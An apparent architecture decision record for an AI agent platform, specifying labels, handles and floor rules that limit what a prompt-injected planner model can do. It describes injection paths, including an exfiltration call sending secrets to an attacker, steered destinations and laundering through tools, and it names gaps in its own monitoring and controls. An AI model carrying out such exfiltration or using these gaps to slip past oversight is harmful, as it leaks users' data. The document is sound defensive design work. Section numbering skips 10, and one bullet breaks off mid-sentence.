# ADR-0047 — The Listener labels what it delivers: a label on every item, and a handle in place of what is suppressed

## Context

Run's ingress is a closed list. The Listener delivers the task, the content of each admitted `Consult` and the result
of each admitted `Actuate`, and nothing else reaches the Thinker (ADR-0043 §1; ADR-0042 §4). Every item is on the
record by digest. Three things are missing.

- **Nothing says where an item came from when a later action is judged.** The floor and the bundle constrain an
  `Actuate`'s tool and the types of its arguments. An injected Thinker may `Actuate(send, {to: attacker, body: secrets})`
  if `send` is allowed with those argument types. The envelope bounds what can happen; nothing bounds what an injected
  Thinker will do inside it (CR-32).
- **Delivery is all or nothing.** An admitted item is delivered whole. There is no way to let a Thinker route content
  it should not read, which is the case for sensitive data as much as for untrusted data.
- **ADR-0037 §2 named the place and stopped.** "If source labels are adopted (the 09.16 review's CR-6), this is where
  they would be attached; this record does not decide that."

**The obstacle is the model.** A value that flows from a `Consult` result into an `Actuate` argument passes through
the Thinker, and a label cannot follow it there. The 10.01 competitive assessment names the two designs that recover
it: keep the content out of the planner and refer to it by handle (FIDES), or split the reader from the planner
(CaMeL). This record takes the first, at the Listener, and leaves the second open.

**The Listener stays a stage.** ADR-0037 rejected a Listener that judges: "a model that decides what the Thinker sees
is a second Thinker without an alphabet." Everything below is computed from the record by rule. The Listener still
has no Persona, holds no alphabet and makes no choice.

## Decision

### 1. Every item of ingress has a label, and the label is a function of its source

**A label is a set of names drawn from a finite vocabulary that the bundle's data declares** *(drafter's choice)*.
The floor reserves two names, `untrusted` and `restricted` (§7); the rest of the vocabulary is the bundle's. A label
has two uses, and they are different questions:

| Use | The question | Protects against |
|---|---|---|
| **Provenance** | Where did this come from, and may it steer an effect? | Injection |
| **Sensitivity** | Who may read this, and where may it go? | Disclosure |

**Each of the three kinds of ingress has a source on the record, and the source declares the label.**

| Item | Its source | Where the label is declared |
|---|---|---|
| The task | The grant | The grant *(drafter's choice)* |
| The content of a `Consult` | The Run root | The root's declaration, for the root or for a named subset of it |
| The result of an `Actuate` | The allowlist entry, by name and digest | The entry (ADR-0040 §3) |

- **A result's label covers its inputs** *(drafter's choice)*. The label of a result is the entry's declared label
  joined with the label of every handle among the call's inputs (§3). Without this a tool given suppressed content
  would return it under its own label.
- **Where an input is a literal, the result's label also takes `clearSet`** ⟨R10⟩ (found by the module; **confirmed
  by the custodian**, 2026.10.04 ⟨R13⟩). A literal may carry anything the Thinker has read in the clear (§4), so a result computed from one may
  too. Without this the record's own F2 and F3 are walked around in two calls: a Thinker that has read untrusted
  content passes a literal to an inside tool that returns what it was given, and then names that result by handle
  as a destination. The result's label would be the inside tool's, F2 sees no literal and F3 sees no `untrusted`.
  `spec/Labels.tla` has the trace under `M_LITERAL`. An entry may declare that it **releases** named labels, which removes them
  from the join. A releasing entry is a declassifier: it is promoted and signed like any other entry, and it is
  visible in the allowlist.
- **The lift is total.** A bundle in which a root or an allowlist entry declares no label is not well-formed and does
  not load *(drafter's choice)*. There is no unlabelled item and no default label at delivery. This is the totality
  check ADR-0007 requires of lifted fields, applied here at the Build gate and at load.
- **A grant that carries a task and no label for it is refused** ⟨R9⟩ (**the custodian's decision**, 2026.10.04
  ⟨R14⟩). The same rule as for the
  bundle: no item is unlabelled and nothing is labelled by default. The label travels with the task, beside the lease
  and not in it, so ADR-0031 §1's field set stays closed. It is on the log with the grant, so a reader can see who
  declared it and what. The alternative, a task that is `untrusted` unless the grant says otherwise, makes an
  omission safe and is not taken: `R6` would then bind every round from its first step, and operators would mark
  every task trusted to get work done.
- **A label is a syntactic lift** (ADR-0007). It is mechanical, total, and read from the record of which grant, root
  or entry produced the item. No model computes one.
- **A label is not a judgment about content.** ADR-0043 §1 stands: whether a delivered item is poisoned is not the
  Listener's to decide, and a judgment about content is an Observer finding. A label says where an item came from and
  what its source was declared to be. A label derived from content, by a classifier or by a pattern, is not decided
  here (Open obligations).

### 2. The Listener delivers each item one of two ways: clear with its label, or as a handle

**The delivery rule is a table in bundle data from label to mode, total over the vocabulary, per seat kind**
*(drafter's choice)*. The Listener looks the item's label up and does what the table says. Where an item's label has
several names, any name whose mode is `handle` suppresses the item.

| Mode | What reaches the Thinker | What does not |
|---|---|---|
| **`clear`** (passthrough) | The item's bytes, with its label | — |
| **`handle`** (suppressed) | A handle and the item's label | The item's bytes |

- **A handle names the item by its place in the record, not by its bytes** *(drafter's choice)*. For a result it is
  the sequence number of the `Actuate` record (ADR-0042 §2). For a `Consult` it is the reference the Thinker supplied.
  Both are already known to the Thinker, so a handle discloses nothing. A digest of the content is not used: a digest
  of low-entropy content can be confirmed by guessing.
- **A handle is whole-item.** A result is clear or it is a handle. Handles on fields within a result need the result's
  schema and are not decided here (Open obligations).
- **The label travels in the delivery's envelope, never inside the content.** Content that contains text imitating a
  label does not change the label the Thinker is given, because the label is a field the mechanism writes.
- **The task is always delivered clear**, with its label *(drafter's choice)*. A Thinker that cannot read its task has
  no round to run.
- **Suppression only subtracts.** A table can withhold what would have been delivered and can deliver nothing that
  was not admitted. The bundle tier may therefore carry it (ADR-0041 §5). The floor does not bound the table directly. It bounds what a
  round may do after a clear delivery (§7), so a table that delivers more in the clear buys a narrower round.
- **A suppressed item is still admitted and still recorded.** The admit, the record and the digests are unchanged.
  Suppression is a property of delivery.

### 3. What a Thinker can do with a handle

**The bytes of a suppressed item do not enter the guest.** Suppression is enforced by what the node sends, not by the
Thinker's cooperation. The decoder runs in the guest (ADR-0018) and has nothing to dereference. **No variant turns a
handle into bytes for the Thinker**, and this record adds none.

**An item delivered as a handle is `ingress` and is not `consumed`** (the custodian's decision, R3). ADR-0035 §1
keeps two sets for a round: `ingress`, what it could have read, and `consumed`, what it did read, never
over-approximated. The Thinker's model did not read a suppressed item, so the item is in the first set and not the
second. An item delivered clear is `consumed`, as it is today. That includes a clear result from a tool that took a
handle, which carries the join of §1.

- **It is sound.** ADR-0035 §2 lets `ingress` be over-approximated and forbids it for `consumed`. Leaving an item out
  of `consumed` can only raise a share, so every share stays an upper bound.
- **It holds even when a tool resolves the handle.** The tool read the bytes and the model did not. Counting the item
  as `consumed` would be more precise; the rule as settled is the conservative one.
- **It reaches no lineage record yet.** Every lineage node is a Build round, and this record labels Run's ingress
  only (§9). The rule is stated in ADR-0035 §1 ⟨R5⟩ so that it is already there if Build's `Read` is labelled.

A handle is still useful, in three ways.

- **The Thinker knows what was withheld and why.** A handle and its label are delivered where a silent drop would
  deliver nothing. The Thinker can reason about the fact that the item exists and what kind of thing it is.
- **A handle may be an argument.** An `Actuate` input may be a handle. The tool host resolves it on the mechanism's
  side and the tool receives the bytes. The Thinker routes content it cannot read. An allowlist entry declares, per
  input, which labels it accepts by handle; a handle whose label the entry does not accept is refused at admit.
- **The Thinker may try again another way.** If it cannot proceed from a handle, it may `Consult` something else,
  call a different tool, or call a tool that takes the handle and returns a narrower result whose label the table
  delivers clear. That last route is a releasing entry (§1), and it is the only way suppressed content becomes
  readable. **Each attempt is an ordinary admit**: it counts against `R`, an `Actuate` is coupled under `K`, and it
  leaves a record. There is no retry path that is not on the log.

### 4. The lift carries labels into the admit

Labels reach policy through schema S. Two attributes are added to an `Actuate`'s context, and the second to a
`Report`'s *(drafter's choice)*.

| Attribute | What it is | How it is computed |
|---|---|---|
| **`inputLabels`** | For each input that is a handle, the label of the item it names | Read from the record the handle names |
| **`clearSet`** | The join of the labels of every item delivered clear to this principal in this round, the task included | A fold over the round's deliveries; it only grows |

- **A literal argument has no label of its own.** A value the Thinker types may derive from anything it has read, and
  the mechanism cannot say which. `clearSet` is the sound bound: everything the Thinker has read in the clear this
  round. A handle argument is the exception, because the mechanism knows exactly what it names.
- **So the sound rules are of two shapes.** A positive rule on a handle: "`send.to` is a handle whose label is within
  `{directory}`". A bound on the round: "no `Actuate` on an external channel once `clearSet` contains `restricted`".
  A rule of the form "deny if this literal derives from an untrusted source" cannot be stated, because a literal has
  no derivation the mechanism can see.
- **History reaches policy only as attributes the mechanism computes** ⟨R13⟩ (the custodian's decision, 2026.10.04).
  `clearSet` is one of a small, fixed, named set, with the sequence number and the round count; each is a fold the
  mechanism defines, and adding one is a mechanism release. Policy declares none of its own. This answers the
  design-gap assessment's row 1.5 for the archetype: no temporal operator enters the policy language.
- **These two are examples.** §7 states the rules the floor must carry. What the bundle adds beyond them is the
  bundle's, and it can only subtract.
- **Suppression is what keeps `clearSet` small.** An item delivered as a handle adds nothing to it. A Thinker can
  route sensitive or untrusted content through tools and keep the outward rules it would lose by reading that content.

### 5. The Observer reads every fact

**Suppressed to the Thinker is not suppressed to the Observer.** The `Actuate` record's payload holds the inputs and
the result in full whatever the delivery mode, and the Observer reads it under `W(p)` as ADR-0043 §4 already requires.

The record's envelope (ADR-0042 §3) gains four fields, all on the control-plane side of ADR-0004's partition:

| Field | What it is |
|---|---|
| `inputLabels` | As §4 |
| `resultLabel` | The label of the result, after the join of §1 |
| `delivery` | `clear` or `handle` |
| `clearSet` | As §4, as it stood when the call was admitted |

- **`Consult` still writes no record to the topic** (ADR-0042 §3 is unchanged). Its admit in the log gains the label
  and the delivery mode. The Observer meets the effect of every clear `Consult` in the `clearSet` of the next
  `Actuate` record, which is inside what its watermark covers.
- **A facts-only reader gains the most.** An Observer or a correlator that reads envelopes and not payloads (ADR-0038
  §3) can now see that an untrusted result was delivered clear and an outward call followed, without reading either.
- **The same label reaching several cells is a correlator input.** This record does not say what the correlator does
  with it (G9 item 43).
- **The delivery table is per seat kind** (§2), so a deployment may suppress an item to an `observer` seat as well.
  An Observer that was given a handle has not read the item, and its watermark must not say it has. Suppressing to an
  Observer is the facts-only narrowing of ADR-0038 §3 for that item, and is declared as one.
- **Labels do not stand in for reading.** The mark asserts that the record was read (ADR-0043 §4). A label tells an
  Observer where to look hardest. It is not a finding and not an exemption.

### 6. This stands beside a Thinker's own defences, and replaces none

A Thinker's Persona may carry its own protection against injection: in its prompt, in its decoder, in its weights, or
in how it treats the labels it is handed.

- **Nothing here assumes such a defence, and nothing here disables one.** The Thinker is havoc in every theorem, so no
  property of this record rests on what the Thinker does with a label.
- **A defence inside the Thinker is not in the trusted base** and earns no rung. It lowers how often an injection
  succeeds. This record bounds what a successful one can then reach.
- **The label delivered with clear content is an input to that defence.** It is computed by the mechanism, so a
  Persona may rely on it where it cannot rely on anything the content says about itself.
- **The layers, in order:** the Thinker's own defence (unverified); the Listener's labels and handles (mechanical);
  rules over labels at the admit (policy); the Observer (semantic, deny-only, after the fact). Each is in addition to
  the others.

### 7. The floor carries a minimum: the injection paths that are obvious and cheap to check

Labels in the bundle alone would leave every rule over them to the tier that a promotion can change. **The floor
therefore carries a minimum, and a bundle cannot loosen it.** The test for an entry is that the path is well known
and that the check is a set-membership test on attributes the mechanism already computed. Anything that needs a
judgment about content is not floor material and stays with the Observer.

**Three terms the floor needs** *(drafter's choice, all three)*.

| Term | What it is | Where it is fixed |
|---|---|---|
| `untrusted` | The reserved provenance name: content that a party outside the deployment could have written | The floor |
| `restricted` | The reserved sensitivity name: content that must not leave the deployment | The floor |
| **Outward entry** | An allowlist entry whose declared channel reaches a target the issued rules do not list as inside the deployment. With no such list, every entry that declares a channel is outward | The entry's channel declaration (ADR-0040 §3) and the issued rules |

**What the floor refuses at admit.** Each is a forbid over schema S.

| | Path | The floor refuses an `Actuate` on an outward entry when |
|---|---|---|
| **F1** | **Read, then send.** Untrusted content steers a call that carries private content out | `clearSet` contains `untrusted`, and `restricted` is in `clearSet` or in any of `inputLabels` |
| **F2** ⟨R13: kept in the floor, by the custodian's decision⟩ | **Steered destination.** Untrusted content names where a call goes, CR-32's `to: attacker` | `clearSet` contains `untrusted`, and an input the entry declares a destination is a literal |
| **F3** | **Replayed content.** Untrusted content is passed straight back out as a destination | An input the entry declares a destination is a handle whose label contains `untrusted`, whatever `clearSet` holds |

**What the floor refuses at load.** A bundle that fails any of these is not well-formed and does not load. This
table says what must be refused and why. **The definitive form of each check is ADR-0049 §6** (W7 to W9) ⟨R7⟩, which
governs the entry's fields and forms.

| | Path | The bundle is refused when |
|---|---|---|
| **F4** | **An outside source passed off as inside** | An outward entry's declared label does not contain `untrusted`. Whatever such a tool returns came from outside |
| **F5** | **A laundering tool** | An entry releases `untrusted` or `restricted` and the issued rules do not name that entry by digest. A declassifier of a reserved name is the anchors' to approve, not a promotion's |
| **F6** | **A forgotten declaration** | A root or an entry declares no label (§1), or an outward entry declares no destination inputs and takes any |

- **F1 to F3 are monotone in `clearSet`.** Delivering more in the clear can only make them refuse more. That is what
  bounds a loosened delivery table (§8).
- **The label itself cannot be forged by content**, because it travels in the envelope (§2). That path is closed by
  the mechanism and needs no floor entry.
- **This is a minimum and it is not complete.** It covers the destination and the outward channel, which are the
  paths every published account of injection starts with. It does not cover an injection that changes what a Thinker
  says in a `Report`, one that acts through an entry that is not outward, or one whose source was declared wrongly
  (§9). Those are the bundle's to narrow and the Observer's to find.
- **F1 to F3 are named by ADR-0041 A1** ⟨R8⟩, drafted and pending: `R5-no-read-then-send`,
  `R6-no-steered-destination` and `R7-no-replayed-destination`. They pass the floor's gates like any other entry:
  each is shown to fire, and none is shown vacuous. This record states what they must refuse.
- **F4 to F6 are not Cedar entries.** They are checks on bundle data, made by the mechanism at load on the floor's
  behalf (ADR-0030 A2), and are harder to change than the floor: a release, not an issuance (§8).
- **Break-glass does not reach past F1 to F3** (ADR-0041 A1, §3): a forbid denies whatever permit is satisfied, as
  R3 already does. An emergency is the moment an injected Thinker would most want one.

### 8. How each part changes

| What changes | Where it lives | How it changes | When it takes effect |
|---|---|---|---|
| A root's or an entry's label; the destination inputs; which labels an input accepts by handle; a release of a name the floor does not reserve | Bundle data | **Bundle promotion**, signed (ADR-0044) | At a principal's next grant (ADR-0031 R2) |
| The delivery table; the vocabulary beyond the two reserved names | Bundle data | **Bundle promotion** | At the next grant |
| The task's label | The grant | Per grant, by the operator | That round |
| F1 to F3; the two reserved names | The floor (ADR-0041 A1: `R5` to `R7`) | **An issuance by the anchors** to relax (ADR-0025 §1 (d)), with the floor's gates | By the floor's own rule |
| F4 to F6 | The mechanism, at bundle load (ADR-0049 §6: W7 to W9; ADR-0030 A2) ⟨R8⟩ | **A mechanism release.** A bundle cannot waive them and an issuance does not change them | At deployment |
| The entries allowed to release a reserved name; the targets listed as inside the deployment | The issued rules (ADR-0025 A2: §1 (h), relettered at B29) | **An issuance by the anchors** | By the rules' own rule |
| The join, the lookup, handle resolution; `inputLabels` and `clearSet` in schema S | Mechanism and schema | A mechanism release | At deployment |

- **A change to the labelling rules is a bundle promotion**, in every row a deployment will change often.
- **A loosening by promotion is bounded by §7, and only by §7.** `bundle ⊑ floor` is decided over action variants and
  says nothing about delivery, and nothing compares a new bundle with the one before it (`mechanism/` finding 2). A
  promoted bundle may move every label to `clear`. What it cannot do is escape F1 to F3, which then see a larger
  `clearSet` and refuse more, or relabel an outward entry as trusted (F4), or add a declassifier of a reserved name
  (F5).
- **What a promotion can still loosen without the floor noticing:** the label of a source that is not outward, the
  Run root's included. That is a wrong declaration (§9), and promotion's gates are the only check on it.
- **Promotion is as strong as its gates.** At the reference, gate evidence is an operator's assertion (G8) and the
  veto seat's independence is not enforced (G18). A labelling change inherits both.
- **The task's label has the weakest path.** It is set by whoever issues the grant, on the operator channel, which
  the corpus does not type (CR-34). No promotion and no anchor sees it. It must be present (§1), and nothing checks
  that it is true. `clearSet` starts from it, so an operator who labels a task from outside as trusted has switched
  `R5` and `R6` off for that round until something else untrusted is read. This is the label forbids' dependency on
  the operator channel, and it is stated in ADR-0045 A1's T-0045-33.
- **A live round keeps the labels it started with.** A new bundle does not relabel items already delivered, and
  `clearSet` is not recomputed.

### 9. What this record does not cover

- **Tool descriptions.** The interface text a Thinker reads is ingress that no allowlist entry names by digest
  (CR-32). It belongs in the entry's schema and is a separate record: ADR-0048, Proposed the same day ⟨R5⟩.
- **A wrong declaration.** A label is what the source was declared to be. F4 holds an outward entry to `untrusted`. A root, or an
  entry that is not outward, labelled as trusted while carrying an attacker's text is not detected by anything here,
  as a mis-declared channel is not (ADR-0040 §3).
- **Flow through the model, item by item.** `clearSet` is a bound on the round, not a trace of a value. Two items read
  in the clear are not distinguished afterwards.
- **Build.** `Read` in Build is scoped to a pinned corpus root. Whether Build's Listener labels is not decided here.
- **Collusion.** An Observer that reads everything and reports nothing is unchanged (ADR-0039 §5; ADR-0043 §7).

### 11. Ratification condition

- **The entry and root declarations are specified**: the label field in the allowlist entry and the Run root, with the
  releasing declaration and the per-input acceptance of §3. **ADR-0049 carries them** ⟨R6⟩ (§1, §6 and §7 there), with
  the channel declaration of ADR-0034 A2 and the interface of ADR-0048, as one schema.
- **Schema S carries `inputLabels` and `clearSet`** (ADR-0030 §4), with the totality gate, and enough of the entry
  for F1 to F3 to be stated: whether it is outward, and which inputs are destinations.
- **F1 to F6 are written and gated.** An ADR-0041 amendment names the entries; the floor's gates show each one fires
  and none is vacuous; the load-time checks refuse a bundle built to fail each of F4, F5 and F6. The issued rules
  carry the two lists of §7, and the rules floor admits them.
- **A module states the properties and its mutations break them**, by the method of ADR-0046. At least:
  `NoUnlabelledDelivery`; `SuppressedNeverInGuest`; `ClearSetOnlyGrows`; `ResultLabelCoversInputs`; and
  `FloorMinimumHolds`, that no admitted outward `Actuate` meets the condition of F1, F2 or F3. Mutations: one drops
  the join, one delivers on a missing declaration, one lets a bundle's table reset `clearSet`.
  **Met for TLC at R10** ⟨R10⟩: `spec/Labels.tla` (`337d7c4bb55e13db`), results `spec/Labels-results-2026.10.03.txt` (`c9c5bc19e8594713`), 33
  rows at `MaxSeq = 3`. It states `FloorMinimumHolds` over what the labels are about, tainted and secret bytes as

## Consequences

**Positive**
- **ADR-0037 §2's reserved sentence is decided**, and CR-6 has a record after four reviews.
- **Policy can say where an argument came from**, in the two shapes that are sound (§4).
- **The best-known injection paths are refused by the floor**, where a promotion cannot remove the refusal (§7), and
  the lethal combination of untrusted input, private content and an outward channel is refused in one entry (F1).
- **A loosened bundle is bounded**, which no other bundle change in the corpus is (§8).
- **A Thinker can use content it may not read**, so sensitive and untrusted content are handled by one mechanism.
- **The Observer and the correlator get labels as facts**, in the envelope they already read.
- **A Thinker's own defence gets an input it can trust** (§6).
- **Every retry is on the log** and counted, so suppression adds no unrecorded path.

**Negative**
- **A Thinker reasons over handles it cannot read.** That is FIDES's trade, and some tasks will not survive it. The
  releasing entry is the relief, and each one is a hole a reviewer must read.
- **A label is a declaration.** It is as true as the bundle's author made it, and nothing checks it against what a
  tool returns (§9).
- **After an untrusted clear read, every result of a call with a literal input is `untrusted`** ⟨R10⟩. A Thinker
  that wants a clean destination later must get it by handle from a call made before the read, or from a call whose
  inputs are all handles. This is the cost of closing the path the module found, and it makes F2's cost (§7) wider.
- **`clearSet` is coarse.** One clear read of a restricted item restricts the rest of the round. Deployments will be
  tempted to label loosely to keep rounds useful.
- **The Listener is no longer free.** ADR-0043 §1 says it adds nothing to the trusted base. The label join, the table
  lookup and handle resolution in the tool host are mechanism code that a suppression claim now rests on.
- **Policy becomes dependent on the round's history**, in the smallest way: one monotone set, computed by the
  mechanism as the sequence number is. It is still the first such attribute in schema S.
- **The Observer reads what the Thinker was not allowed to.** An injection withheld from a Thinker is delivered to its
  Observer. The Observer cannot act on it, so the cost is a missed finding, which is collusion's case (ADR-0039 §5).
- **The floor grows by six entries and two reserved names**, and the issued rules by two lists. Each is more for the
  anchors to hold and more for the gates to check.
- **F2 will refuse honest work.** A Thinker that has read anything untrusted in the clear cannot type a destination
  for an outward call. It must take the destination from a handle, or the round must be laid out so the outward call
  comes first. Deployments will feel this before they feel any other part of the record.
- **"Outward" rests on the channel declaration**, whose schema is still an open obligation (ADR-0040; ADR-0049, Proposed). Its owner is in force since Batch 30
  (ADR-0034 A2). Until the issued rules list the targets inside a deployment, the conservative reading applies and
  most Run tools are outward ⟨R15⟩.
- **One author, one day, and no module yet.**

## Findings

1. **Injection and disclosure are one mechanism and two orders.** Provenance is an integrity question and sensitivity
   is a confidentiality one. CR-32's own example needs both: `to` is the first and `body` is the second. A vocabulary
   that mixes them in one set of names works, and a reader should know that the two joins point in different
   directions for release.
2. **A `Consult` reference is already a handle.** The Thinker supplies a content address and receives content.
   Suppressing a `Consult` leaves the Thinker holding the reference it started with, now usable as a tool input.
3. **`clearSet` is a temporal condition.** It is the first place policy reads the round's history, and it arrives as
   a mechanism-computed attribute, not as a temporal operator in the policy language. That is one answer to the
   history-dependent-policy gap (design-gap assessment row 1.5) for the one case that needs it most.
4. **Write-time masking pulls the other way.** ADR-0003 item 0003.6 masks on the way out to the round topic. §5 needs
   the payload in the clear on that topic for the Observer. One label could drive both, and a deployment that masks
   the topic has made its Observer a facts-only reader for that item. The two records do not yet say this.
5. **ADR-0043 finding 3 gets sharper.** An Observer's ingress has no stage named for it. A per-seat-kind delivery
   table (§2) gives it delivery modes without giving it a Listener.
6. **The delivery table is the first policy that acts on ingress.** Every other policy decision in the corpus is on
   an action leaving a principal. The table decides nothing about admission, and it is still a decision point that
   `bundle ⊑ floor` was not written to cover. §7 does not close that. It makes the gap safe to leave, because the
   floor's entries read the table's effect and not the table.
7. **The floor's minimum is the published "lethal trifecta" stated over three computed sets.** F1 needs no knowledge
   of content: it asks whether the round has read something untrusted, holds something restricted, and is calling
   out. That it can be said at all is what `clearSet` was for.

8. **ADR-0042 §4 says something this record makes false.** "The bytes the principal receives are the bytes that
   digest names." For a suppressed item the principal receives no bytes. The closed list survives, and so does the
   rule that a result the record does not name is not delivered. The sentence needs the handle case: what the
   principal receives is the bytes the digest names, or a handle to the record that names them.
9. **Lineage needed an answer, and has one.** A suppressed item is admitted and is never read by the Thinker's
   model, and ADR-0035 §1 counts what was read. The custodian settled it at R3 (§3): `ingress`, not `consumed`. Two
   things follow. ADR-0035's overlap measure (E3) takes its numerator over `ingress` and its share of the smaller
   `consumed` set, so suppression leaves the numerator alone and can shrink the denominator. And the rule is
   idle for now: lineage nodes are Build rounds and this record labels Run, so no record's `consumed` set changes
   until Build's `Read` is labelled. ADR-0035 §1 ⟨R5⟩ carries the rule and says so.
10. **The decoder has to be able to say a handle.** ADR-0043 §3 fixes what a Run Persona's decoder emits. An input
    that is a handle is a new form inside `Actuate`'s inputs, not a new variant, and the validator must tell it from
    a literal that merely looks like one. That makes this record a trigger for decoder–alphabet compatibility (G5
    item 17), as the rename in ADR-0043 was.
11. **The first model of this record found a hole in it.** As written before R10, a literal passed through an inside
    tool came back with that tool's label, and a handle to the result was a clean destination. The property that
    caught it is stated over ghost truth, which bytes are really tainted, and a version stated over the mechanism's
    labels would have passed. That is an argument for stating every label property that way, and for treating the
    nine revisions before R10 as unreviewed.
